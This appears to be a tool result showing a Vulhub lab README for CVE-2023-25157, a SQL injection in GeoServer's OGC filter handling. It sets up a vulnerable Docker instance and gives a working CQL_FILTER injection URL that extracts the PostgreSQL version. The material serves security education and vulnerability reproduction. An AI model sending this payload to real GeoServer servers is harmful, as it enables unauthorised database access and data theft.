ToolResultBlock(tool_use_id='call_00_D9oPubIA1rii9lopa3BcCKmh', content="1	# GeoServer OGC Filter SQL Injection (CVE-2023-25157)
2	
3	[中文版本(Chinese version)](README.zh-cn.md)
4	
5	GeoServer is an open-source software server written in Java that provides the ability to view, edit, and share geospatial data. It is designed to be a flexible, efficient solution for distributing geospatial data from a variety of sources such as Geographic Information System (GIS) databases, web-based data, and personal datasets.
6	
7	In the version prior to 2.22.1 and 2.21.4, there is a SQL injection issue that was found in the filter and function expressions defined by the Open Geospatial Consortium (OGC) standards.
8	
9	References:
10	
11	- <https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158>
12	- <https://github.com/advisories/GHSA-7g5f-wrx8-5ccf>
13	
14	## Vulnerable environment
15	
16	Execute following command to start a GeoServer instance 2.22.1:
17	
18	```
19	docker compose up -d
20	```
21	
22	After the server is started, you can browse the default page of GeoServer at `http://your-ip:8080/geoserver`.
23	
24	## Exploit
25	
26	First of all, you have to find a existing workspace that contains PostGIS datastore before you exploit the vulnerability. Vulhub's GeoServer instance already have a PostGIS datastore:
27	
28	- Workspace name: `vulhub`
29	- Data store name: `pg`
30	- Feature type (table) name: `example`
31	- One of attribute from feature type: `name`
32	
33	Exploit the server by these steps:
34	
35	Visit the following URL to get the list of Feature Type:
36	
37	```
38	http://your-ip:8080/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities
39	```
40	
41	![](1.png)
42	
43	Visit the following URL to get attributes from a feature type:
44	
45	```
46	http://your-ip:8080/geoserver/ows?service=wfs&version=1.0.0&request=DescribeFeatureType&typeName=ne:populated_places
47	```
48	
49	![](2.png)
50	
51	Using these known parameters, sending the following URL can trigger an SQL injection vulnerability:
52	
53	```
54	http://your-ip:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&CQL_FILTER=strStartsWith%28name%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true
55	```
56	
57	![](3.png)
58	
59	As you can see, the version of PostgreSQL has been retrieved from GeoServer by SQL injection.
